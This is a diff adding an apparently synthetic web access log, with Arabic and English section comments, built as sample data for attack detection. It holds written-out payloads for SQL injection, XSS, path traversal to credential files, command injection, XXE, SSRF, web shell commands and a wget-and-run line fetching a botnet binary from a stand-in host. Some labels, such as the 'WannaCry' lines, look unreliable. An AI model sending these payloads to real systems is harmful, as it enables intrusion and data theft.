@@ -1,0 +1,126 @@
+# malicious_access.log
+# ملف سجل وصول يحتوي على أنشطة هجومية متنوعة
+
+192.168.1.100 - - [03/Feb/2026:02:57:03 +0300] "GET /index.html HTTP/1.1" 200 1450
+192.168.1.100 - - [03/Feb/2026:02:57:04 +0300] "GET /admin/ HTTP/1.1" 200 2301
+192.168.1.100 - - [03/Feb/2026:02:57:05 +0300] "GET /admin/login.php HTTP/1.1" 200 1789
+192.168.1.100 - - [03/Feb/2026:02:57:06 +0300] "GET /wp-admin/ HTTP/1.1" 404 210
+192.168.1.100 - - [03/Feb/2026:02:57:07 +0300] "GET /phpmyadmin/ HTTP/1.1" 404 210
+192.168.1.100 - - [03/Feb/2026:02:57:08 +0300] "GET /mysql/ HTTP/1.1" 404 210
+
+# هجمات SQL Injection
+192.168.1.50 - - [03/Feb/2026:02:58:01 +0300] "GET /products.php?id=1' OR '1'='1 HTTP/1.1" 500 123
+192.168.1.50 - - [03/Feb/2026:02:58:02 +0300] "GET /login.php?user=admin'-- HTTP/1.1" 200 456
+192.168.1.50 - - [03/Feb/2026:02:58:03 +0300] "POST /search.php HTTP/1.1" 200 678 "search=test' UNION SELECT username,password FROM users--"
+192.168.1.50 - - [03/Feb/2026:02:58:04 +0300] "GET /product.php?id=1 AND SLEEP(5)-- HTTP/1.1" 200 789
+192.168.1.50 - - [03/Feb/2026:02:58:05 +0300] "GET /api/user?id=1; DROP TABLE users-- HTTP/1.1" 500 234
+
+# هجمات XSS (Cross-Site Scripting)
+192.168.1.75 - - [03/Feb/2026:02:59:01 +0300] "GET /search?q=<script>alert('XSS')</script> HTTP/1.1" 200 345
+192.168.1.75 - - [03/Feb/2026:02:59:02 +0300] "GET /profile?name=<img src=x onerror=alert(1)> HTTP/1.1" 200 456
+192.168.1.75 - - [03/Feb/2026:02:59:03 +0300] "POST /comment HTTP/1.1" 200 567 "comment=<svg/onload=alert('HACKED')>"
+192.168.1.75 - - [03/Feb/2026:02:59:04 +0300] "GET /redirect?url=javascript:alert(document.cookie) HTTP/1.1" 302 123
+
+# Directory Traversal Attacks
+10.0.0.12 - - [03/Feb/2026:03:00:01 +0300] "GET /../../../etc/passwd HTTP/1.1" 403 189
+10.0.0.12 - - [03/Feb/2026:03:00:02 +0300] "GET /../../windows/win.ini HTTP/1.1" 403 167
+10.0.0.12 - - [03/Feb/2026:03:00:03 +0300] "GET /images/..%2f..%2fetc%2fpasswd HTTP/1.1" 403 178
+10.0.0.12 - - [03/Feb/2026:03:00:04 +0300] "GET /download?file=../../../../etc/shadow HTTP/1.1" 403 195
+
+# Command Injection Attacks
+172.16.0.25 - - [03/Feb/2026:03:01:01 +0300] "GET /ping.php?ip=127.0.0.1;ls -la HTTP/1.1" 200 456
+172.16.0.25 - - [03/Feb/2026:03:01:02 +0300] "GET /exec.php?cmd=whoami HTTP/1.1" 200 345
+172.16.0.25 - - [03/Feb/2026:03:01:03 +0300] "GET /system?command=cat /etc/passwd|grep root HTTP/1.1" 200 567
+172.16.0.25 - - [03/Feb/2026:03:01:04 +0300] "GET /api.php?param=test`id` HTTP/1.1" 200 234
+
+# Shell Upload Attempts (محتوى مشبوه يشير إلى رفع ملفات)
+203.0.113.5 - - [03/Feb/2026:03:02:01 +0300] "POST /upload.php HTTP/1.1" 200 1234 "Content-Type: multipart/form-data; boundary=----WebKitFormBoundary"
+203.0.113.5 - - [03/Feb/2026:03:02:02 +0300] "GET /c99.php HTTP/1.1" 404 210
+203.0.113.5 - - [03/Feb/2026:03:02:03 +0300] "GET /wso.php HTTP/1.1" 404 210
+203.0.113.5 - - [03/Feb/2026:03:02:04 +0300] "GET /shell.php HTTP/1.1" 404 210
+203.0.113.5 - - [03/Feb/2026:03:02:05 +0300] "GET /b374k.php HTTP/1.1" 404 210
+
+# Brute Force Attacks على صفحات Login
+192.168.2.100 - - [03/Feb/2026:03:03:01 +0300] "POST /login.php HTTP/1.1" 401 123 "username=admin&password=admin"
+192.168.2.100 - - [03/Feb/2026:03:03:02 +0300] "POST /login.php HTTP/1.1" 401 123 "username=admin&password=123456"
+192.168.2.100 - - [03/Feb/2026:03:03:03 +0300] "POST /login.php HTTP/1.1" 401 123 "username=admin&password=password"
+192.168.2.100 - - [03/Feb/2026:03:03:04 +0300] "POST /login.php HTTP/1.1" 401 123 "username=admin&password=root"
+192.168.2.100 - - [03/Feb/2026:03:03:05 +0300] "POST /login.php HTTP/1.1" 401 123 "username=admin&password=letmein"
+192.168.2.100 - - [03/Feb/2026:03:03:06 +0300] "POST /login.php HTTP/1.1" 401 123 "username=admin&password=qwerty"
+192.168.2.100 - - [03/Feb/2026:03:03:07 +0300] "POST /login.php HTTP/1.1" 401 123 "username=admin&password=111111"
+
+# Scanning for Vulnerabilities
+198.51.100.23 - - [03/Feb/2026:03:04:01 +0300] "GET /phpinfo.php HTTP/1.1" 404 210
+198.51.100.23 - - [03/Feb/2026:03:04:02 +0300] "GET /test.php HTTP/1.1" 404 210
+198.51.100.23 - - [03/Feb/2026:03:04:03 +0300] "GET /debug.php HTTP/1.1" 404 210
+198.51.100.23 - - [03/Feb/2026:03:04:04 +0300] "GET /console/ HTTP/1.1" 404 210
+198.51.100.23 - - [03/Feb/2026:03:04:05 +0300] "GET /adminer.php HTTP/1.1" 404 210
+
+# محاولات الوصول إلى ملفات Config
+203.0.113.45 - - [03/Feb/2026:03:05:01 +0300] "GET /.env HTTP/1.1" 403 167
+203.0.113.45 - - [03/Feb/2026:03:05:02 +0300] "GET /config.php HTTP/1.1" 403 178
+203.0.113.45 - - [03/Feb/2026:03:05:03 +0300] "GET /database.yml HTTP/1.1" 404 189
+203.0.113.45 - - [03/Feb/2026:03:05:04 +0300] "GET /.git/config HTTP/1.1" 403 167
+
+# محاولات استغلال ثغرات معروفة
+192.168.3.50 - - [03/Feb/2026:03:06:01 +0300] "GET /wp-login.php HTTP/1.1" 200 4567
+192.168.3.50 - - [03/Feb/2026:03:06:02 +0300] "GET /wp-content/plugins/akismet/readme.txt HTTP/1.1" 200 1234
+192.168.3.50 - - [03/Feb/2026:03:06:03 +0300] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 210
+192.168.3.50 - - [03/Feb/2026:03:06:04 +0300] "GET /actuator/health HTTP/1.1" 404 210
+
+# XML External Entity (XXE) Attacks
+10.0.1.100 - - [03/Feb/2026:03:07:01 +0300] "POST /xmlparser.php HTTP/1.1" 200 789 "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><root>&xxe;</root>"
+10.0.1.100 - - [03/Feb/2026:03:07:02 +0300] "POST /api/xml HTTP/1.1" 200 456 "Content-Type: application/xml"
+
+# Server-Side Request Forgery (SSRF)
+172.17.0.10 - - [03/Feb/2026:03:08:01 +0300] "GET /proxy?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1" 200 345
+172.17.0.10 - - [03/Feb/2026:03:08:02 +0300] "GET /fetch?url=file:///etc/passwd HTTP/1.1" 200 456
+
+# Log Injection
+192.168.1.66 - - [03/Feb/2026:03:09:01 +0300] "GET /index.php?param=test%0d%0aHacked-By: EvilHacker%0d%0aInjection: Successful HTTP/1.1" 200 234
+
+# طلبات غير طبيعية (Abnormal Requests)
+127.0.0.1 - - [03/Feb/2026:03:10:01 +0300] "GET / HTTP/1.1" 200 1450 "User-Agent: sqlmap/1.6#dev (http://sqlmap.org)"
+127.0.0.1 - - [03/Feb/2026:03:10:02 +0300] "GET / HTTP/1.1" 200 1450 "User-Agent: nmap/7.92"
+127.0.0.1 - - [03/Feb/2026:03:10:03 +0300] "GET / HTTP/1.1" 200 1450 "User-Agent: Metasploit"
+
+# طلبات من عناوين IP مشبوهة (من قوائم Threat Intelligence)
+185.220.101.33 - - [03/Feb/2026:03:11:01 +0300] "GET / HTTP/1.1" 200 1450
+45.155.205.233 - - [03/Feb/2026:03:11:02 +0300] "GET /admin/ HTTP/1.1" 403 167
+91.219.238.11 - - [03/Feb/2026:03:11:03 +0300] "POST /wp-login.php HTTP/1.1" 200 4567
+
+# طلبات تحمل إشارات هجوم فيروس
+192.168.4.100 - - [03/Feb/2026:03:12:01 +0300] "GET /cgi-bin/test.cgi HTTP/1.1" 404 210
+192.168.4.100 - - [03/Feb/2026:03:12:02 +0300] "GET /..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255c/windows/system32/cmd.exe HTTP/1.1" 404 210
+192.168.4.100 - - [03/Feb/2026:03:12:03 +0300] "GET /_vti_bin/owssvr.dll HTTP/1.1" 404 210
+
+# WannaCry Ransomware Signature
+192.168.5.50 - - [03/Feb/2026:03:13:01 +0300] "GET /windows/system32/drivers/etc/smb.bat HTTP/1.1" 404 210
+192.168.5.50 - - [03/Feb/2026:03:13:02 +0300] "POST /cgi-bin/echo HTTP/1.1" 404 210 "Content-Type: application/x-www-form-urlencoded"
+
+# Mirai Botnet Scanning
+185.244.25.234 - - [03/Feb/2026:03:14:01 +0300] "GET / HTTP/1.1" 200 1450 "User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
+185.244.25.234 - - [03/Feb/2026:03:14:02 +0300] "GET /shell?cd /tmp; wget http://malicious.com/mirai.x86; chmod 777 mirai.x86; ./mirai.x86; HTTP/1.1" 404 210
+
+# Cryptojacking Attempt
+203.0.113.100 - - [03/Feb/2026:03:15:01 +0300] "GET /miner.js HTTP/1.1" 404 210
+203.0.113.100 - - [03/Feb/2026:03:15:02 +0300] "GET /crypto-miner.js HTTP/1.1" 404 210
+203.0.113.100 - - [03/Feb/2026:03:15:03 +0300] "GET /coinhive.min.js HTTP/1.1" 404 210
+
+# Web Shell Communication (Command & Control)
+10.0.0.66 - - [03/Feb/2026:03:16:01 +0300] "GET /backdoor.php?cmd=ipconfig HTTP/1.1" 200 456
+10.0.0.66 - - [03/Feb/2026:03:16:02 +0300] "GET /backdoor.php?cmd=netstat -an HTTP/1.1" 200 567
+10.0.0.66 - - [03/Feb/2026:03:16:03 +0300] "GET /backdoor.php?cmd=whoami /all HTTP/1.1" 200 678
+
+# Data Exfiltration Attempt
+192.168.6.100 - - [03/Feb/2026:03:17:01 +0300] "POST /exfil.php HTTP/1.1" 200 1234 "data=[ENCRYPTED_DATA]"
+192.168.6.100 - - [03/Feb/2026:03:17:02 +0300] "GET /dump.php?table=users HTTP/1.1" 200 2345
+192.168.6.100 - - [03/Feb/2026:03:17:03 +0300] "GET /export.php?type=csv&table=customers HTTP/1.1" 200 3456
+
+# طلبات عادية لخلط السجل (لجعل السجل واقعي)
+203.0.113.200 - - [03/Feb/2026:03:18:01 +0300] "GET /about.html HTTP/1.1" 200 2345
+203.0.113.200 - - [03/Feb/2026:03:18:02 +0300] "GET /contact.php HTTP/1.1" 200 1987
+203.0.113.200 - - [03/Feb/2026:03:18:03 +0300] "GET /products/category/electronics HTTP/1.1" 200 3456
+192.168.1.150 - - [03/Feb/2026:03:19:01 +0300] "GET /images/logo.png HTTP/1.1" 200 15678
+192.168.1.150 - - [03/Feb/2026:03:19:02 +0300] "GET /css/style.css HTTP/1.1" 200 4567
+192.168.1.150 - - [03/Feb/2026:03:19:03 +0300] "GET /js/app.js HTTP/1.1" 200 7890
